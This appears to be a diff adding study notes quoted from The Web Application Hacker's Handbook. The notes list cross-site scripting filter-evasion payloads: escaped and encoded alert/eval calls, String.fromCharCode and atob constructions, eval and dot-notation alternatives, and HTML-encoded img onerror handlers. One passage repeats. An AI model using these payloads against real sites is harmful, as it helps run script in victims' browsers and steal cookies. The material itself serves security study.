@@ -200,3 +200,45 @@ UTF-16
 63 00 6F 00 6F 00 6B 00 69 00 65 00 29 00 3C 00 ; c.o.o.k.i.e.).<.
 2F 00 73 00 63 00 72 00 69 00 70 00 74 00 3E 00 ; /.s.c.r.i.p.t.>.
 Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12400-12409). Wiley. Kindle Edition. 
+
+Unicode escapes can be used to represent characters within JavaScript keywords, allowing you to bypass many 
+kinds of filters: 
+<script>a\u006cert(1);</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12449-12451). Wiley. Kindle Edition. 
+
+Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, and octal escapes: <script>eval('a\u006cert(1)');</script>
+<script>eval('a\x6cert(1)');</script>
+<script>eval('a\154ert(1)');</script>
+ Furthermore, superfluous escape characters within strings are ignored: <script>eval('a\l\ert\(1\)');</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12456-12464). Wiley. Kindle Edition. 
+
+Within JavaScript strings, you can use Unicode escapes, hexadecimal escapes, and octal escapes: 
+<script>eval('a\u006cert(1)');</script>
+<script>eval('a\x6cert(1)');</script>
+<script>eval('a\154ert(1)');</script>
+ Furthermore, superfluous escape characters within strings are ignored: <script>eval('a\l\ert\(1\)');</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12456-12464). Wiley. Kindle Edition.
+
+Dynamically Constructing Strings You can use other techniques to dynamically construct strings to use in your attacks:
+<script>eval(‘al’+‘ert(1)’);</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
+<script>eval(atob('amF2YXNjcmlwdDphbGVydCgxKQ'));</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12465-12470). Wiley. Kindle Edition. 
+
+Alternatives to eval If direct calls to the eval command are not possible, you have other ways to execute commands in 
+string form: <script>'alert(1)'.replace(/.+/,eval)</script>
+<script>function::[‘alert’](1)</script>
+ Alternatives to Dots If the dot character is being blocked, you can use other methods to perform dereferences: 
+ <script>alert(document[‘cookie’])</script>
+<script>with(document)alert(cookie)</script>
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12473-12482). Wiley. Kindle Edition. 
+
+In the following example, the “e” character in “alert” has been escaped using Unicode escaping, and the backslash 
+used in the Unicode escape
+has been HTML-encoded: <img onerror=eval('al&#x5c;u0065rt(1)') src=a>
+ Of course, any of the other characters within the onerror attribute value could also be HTML-encoded to further hide 
+ the attack: <img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
+ This technique enables you to bypass many filters on JavaScript code, because you can avoid using any JavaScript
+ keywords or other syntax such as quotes, periods, and brackets.
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12489-12499). Wiley. Kindle Edition. 
+
